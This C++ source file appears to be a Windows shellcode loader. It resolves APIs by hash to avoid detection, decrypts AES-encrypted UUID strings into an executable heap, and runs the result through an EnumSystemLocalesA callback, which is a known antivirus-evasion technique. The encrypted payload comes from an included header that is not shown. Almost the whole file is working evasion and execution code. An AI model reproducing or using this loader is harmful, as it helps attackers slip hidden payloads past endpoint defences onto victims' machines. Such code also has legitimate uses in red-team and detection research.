// ReSharper disable CppLocalVariableMayBeConst
// ReSharper disable CppUseAuto
// ReSharper disable CppClangTidyModernizeUseAuto
// ReSharper disable CppCStyleCast
// ReSharper disable CppClangTidyClangDiagnosticCastQual
// ReSharper disable CppClangTidyClangDiagnosticOldStyleCast
#include <iostream>
#include <Windows.h>

#include "aes.h"
#include "filters.h"
#include "modes.h"

#include "GetProcAddressWithHash.h"
#include "CryptPayload.h"

#pragma comment(lib, "cryptlib")

typedef HMODULE(WINAPI* Ll)(LPCSTR);
Ll fLoadLibraryA;

typedef BOOL(WINAPI* Ch)(HANDLE);
Ch fCloseHandle;

typedef BOOL(WINAPI* Esl)(LOCALE_ENUMPROCA, DWORD);
Esl fEnumSystemLocalesA;

typedef RPC_STATUS(WINAPI* Ua)(RPC_CSTR, UUID*);
Ua fUuidFromStringA;
	
int main()
{
    fLoadLibraryA = (Ll)GetProcAddressWithHash(0x0726774C);
    fCloseHandle = (Ch)GetProcAddressWithHash(0x528796C6);
    fEnumSystemLocalesA = (Esl)GetProcAddressWithHash(0x5B6BC072);
	if (!fLoadLibraryA || !fCloseHandle || !fEnumSystemLocalesA)
	{
#ifdef _DEBUG
        printf("[-] Unable to get proc address:\n  LoadLibraryA\n   CloseHandle\n   EnumSystemLocalesA\n");
#endif
        return -1;
	}

    HMODULE rpcrt4Dll = fLoadLibraryA("Rpcrt4.dll");
    if (!rpcrt4Dll)
    {
#ifdef _DEBUG
        printf("[-] Unable to load library: Rpcrt4.dll\n");
#endif
	    return -1;
    }

	fUuidFromStringA = (Ua)GetProcAddressWithHash(0xA483218A);
	if (!fUuidFromStringA)
	{
#ifdef _DEBUG
        printf("[-] Unable to get proc address: UuidFromStringA\n");
#endif
		return -1;
	}  
	   
	HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* pvBuf = nullptr;
	if (hHeap)
        pvBuf = HeapAlloc(hHeap, 0, 0x100000);
    DWORD_PTR pdwBuf = (DWORD_PTR)pvBuf;
	
    int iElems = sizeof(encryptedUuids) / sizeof(encryptedUuids[0]);

    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
    dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
	
    for (int i = 0; i < iElems; i++) 
    {
	    std::string recoveredUuid;
    	CryptoPP::ArraySource s(
            encryptedUuids[i], 
            sizeof(encryptedUuids[i]), 
            true,
            new CryptoPP::StreamTransformationFilter(
                dec,
                new CryptoPP::StringSink(recoveredUuid)
		    )
        );

#ifdef _DEBUG
        printf("[+] %s\n", recoveredUuid.c_str());
#endif

    	// todo: xor uuid
        RPC_STATUS status = fUuidFromStringA((RPC_CSTR)recoveredUuid.c_str(), (UUID*)pdwBuf);
        if (status != RPC_S_OK) {
#ifdef _DEBUG
            printf("[-] UuidFromStringA() != S_OK\n");
#endif
            if (pvBuf)
				fCloseHandle(pvBuf);
            return -1;
        }
        pdwBuf += 16;
    }
	
#ifdef _DEBUG
    printf("[*] Hexdump: ");
    for (int i = 0; i < iElems * 16; i++) {
        printf("%02X ", ((unsigned char*)pvBuf)[i]);
    }
#endif

	if (pvBuf)
	{
		fEnumSystemLocalesA((LOCALE_ENUMPROCA)pvBuf, 0);
        fCloseHandle(pvBuf);
        return 0;
	}
    return -2;
}